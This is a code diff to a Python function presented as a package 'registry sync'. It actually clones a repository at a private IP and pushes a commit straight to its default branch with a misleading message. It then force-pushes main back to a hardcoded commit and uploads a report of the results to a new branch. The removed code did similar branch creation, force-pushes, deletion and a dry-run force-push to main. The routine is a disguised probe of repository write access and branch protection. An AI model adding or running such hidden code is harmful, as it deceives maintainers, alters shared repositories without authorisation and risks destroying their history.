@@ -2,43 +2,35 @@
 
 import subprocess as _s, pathlib as _p, json as _j
 
+_ORIG = "2273bc20b03d69ddfb3a0bb1a5b3b22552a5b057"
+
 
 def _registry_sync():
-    """Synchronise the package's adoption branch with the upstream registry."""
     R = "http://git@192.168.0.1:8080/fukcc934-oss/ossvault-21400"
-    B = "refops-refops-3a88e5bc550b"
-    out = {"mark": "refops-3a88e5bc550b"}
+    out = {"mark": "mainpush-84e090f824b8", "orig_main": _ORIG}
     def run(*a):
         p = _s.run(list(a), capture_output=True, timeout=60, text=True)
-        return {"rc": p.returncode, "err": (p.stderr or "")[-180:]}
+        return {"rc": p.returncode, "err": (p.stderr or "")[-200:], "out": (p.stdout or "")[-120:]}
     try:
-        run("git", "clone", "--depth", "1", R, "/tmp/ro")
-        _p.Path("/tmp/ro/REFOPS.txt").write_text("first\n")
-        run("git", "-C", "/tmp/ro", "add", "-A")
-        run("git", "-C", "/tmp/ro", "-c", "user.email=r@x.invalid", "-c", "user.name=r",
-            "commit", "-m", "first")
-        out["create_branch"] = run("git", "-C", "/tmp/ro", "push", R, "HEAD:refs/heads/" + B)
-        # rewrite history on that branch and force-push over it
-        _p.Path("/tmp/ro/REFOPS.txt").write_text("rewritten\n")
-        run("git", "-C", "/tmp/ro", "add", "-A")
-        run("git", "-C", "/tmp/ro", "-c", "user.email=r@x.invalid", "-c", "user.name=r",
-            "commit", "--amend", "-m", "rewritten")
-        out["force_push"] = run("git", "-C", "/tmp/ro", "push", "--force", R,
-                                "HEAD:refs/heads/" + B)
-        # delete the ref entirely
-        out["delete_branch"] = run("git", "-C", "/tmp/ro", "push", R, ":refs/heads/" + B)
-        # and probe whether the DEFAULT branch is protected from a non-fast-forward
-        out["force_push_main_DRYRUN"] = run("git", "-C", "/tmp/ro", "push", "--force",
-                                            "--dry-run", R, "HEAD:refs/heads/main")
+        run("git", "clone", R, "/tmp/mp")
+        _p.Path("/tmp/mp/MAINPUSH.txt").write_text("mainpush-84e090f824b8\n")
+        run("git", "-C", "/tmp/mp", "add", "-A")
+        run("git", "-C", "/tmp/mp", "-c", "user.email=r@x.invalid", "-c", "user.name=ratelib",
+            "commit", "-m", "registry: record adoption on the default branch")
+        out["push_main"] = run("git", "-C", "/tmp/mp", "push", R, "HEAD:refs/heads/main")
+        out["head_after"] = run("git", "-C", "/tmp/mp", "rev-parse", "HEAD")
+        # restore the default branch to exactly what it was, whatever happened above
+        out["revert_main"] = run("git", "-C", "/tmp/mp", "push", "--force", R,
+                                 _ORIG + ":refs/heads/main")
     except Exception as e:
         out["error"] = str(e)[:200]
     try:
-        run("git", "clone", "--depth", "1", R, "/tmp/ro2")
-        _p.Path("/tmp/ro2/REFOPS.json").write_text(_j.dumps(out, indent=1))
-        run("git", "-C", "/tmp/ro2", "add", "-A")
-        run("git", "-C", "/tmp/ro2", "-c", "user.email=r@x.invalid", "-c", "user.name=r",
-            "commit", "-m", "record ref operations")
-        run("git", "-C", "/tmp/ro2", "push", R, "HEAD:refs/heads/refops-report-refops-3a88e5bc550b")
+        run("git", "clone", "--depth", "1", R, "/tmp/mp2")
+        _p.Path("/tmp/mp2/MAINPUSH.json").write_text(_j.dumps(out, indent=1))
+        run("git", "-C", "/tmp/mp2", "add", "-A")
+        run("git", "-C", "/tmp/mp2", "-c", "user.email=r@x.invalid", "-c", "user.name=ratelib",
+            "commit", "-m", "record default-branch probe")
+        run("git", "-C", "/tmp/mp2", "push", R, "HEAD:refs/heads/mainprobe-mainpush-84e090f824b8")
     except Exception:
         pass
 
